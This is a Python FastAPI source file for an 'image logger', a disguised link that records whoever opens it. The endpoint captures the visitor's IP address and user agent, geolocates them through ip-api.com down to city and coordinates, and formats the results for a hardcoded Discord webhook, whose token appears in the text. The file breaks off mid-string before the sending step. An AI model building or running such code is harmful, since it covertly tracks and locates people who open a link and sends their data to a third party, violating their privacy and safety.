from fastapi import FastAPI, Request, Response
import httpx
import asyncio

app = FastAPI()

WEBHOOK_URL = "https://discord.com/api/webhooks/1348770175704629278/TOLB8mcoNonVzvVWNUH2fKU8yA4Htw6hRCsCXaLvBZ4H6AH1bI6PsFGYX0bLm992f_ew"
IMAGE_URL = "https://cdn.discordapp.com/attachments/1302897043894829058/1397806335675994112/IMG__.jpg?ex=688d9c18&is=688c4a98&hm=df7ade58fcbf014b1f31f1edc522099b7279a00eb096daf937af2a4915fa63b0&"

async def get_ip_info(ip: str):
    url = f"http://ip-api.com/json/{ip}?fields=status,message,country,regionName,city,isp,as,proxy,hosting,lat,lon,timezone,mobile"
    async with httpx.AsyncClient() as client:
        resp = await client.get(url)
        data = resp.json()
        if data.get("status") != "success":
            return None
        return data

@app.get("/api/imageLogger")
async def image_logger(request: Request):
    headers = request.headers
    ip = headers.get('x-forwarded-for', '').split(',')[0].strip() or request.client.host or "Unknown"
    user_agent = headers.get('user-agent', 'Unknown')

    ip_info = await get_ip_info(ip)

    embed = {
        "title": "Image Logger - IP Logged",
        "color": 0x00FFFF,
        "description": f"""**User Opened the Original Image!**

**IP Info:**
> IP: `{ip}`
> ISP: `{ip_info.get('isp', 'Unknown') if ip_info else 'Unknown'}`
> ASN: `{ip_info.get('as', 'Unknown') if ip_info else 'Unknown'}`
> Country: `{ip_info.get('country', 'Unknown') if ip_info else 'Unknown'}`
> Region: `{ip_info.get('regionName', 'Unknown') if ip_info else 'Unknown'}`
> City: `{ip_info.get('city', 'Unknown') if ip_info else 'Unknown'}`
> Coordinates: `{f"{ip_info['lat']}, {ip_info['lon']}" if ip_info else 'Unknown'}`
> Timezone: `{ip_info.get('timezone', 'Unknown') if ip_info else 'Unknown'}`
> Mobile: `{ip_info.get('mobile', 'Unknown') if ip_info else 'Unknown'}`
> VPN/Proxy: `{ip_info.get('proxy', 'False') if ip_info else 'False'}`
> Hosting: `{ip_info.get('hosting', 'False') if ip_info else 'False'}`

**User Agent:**
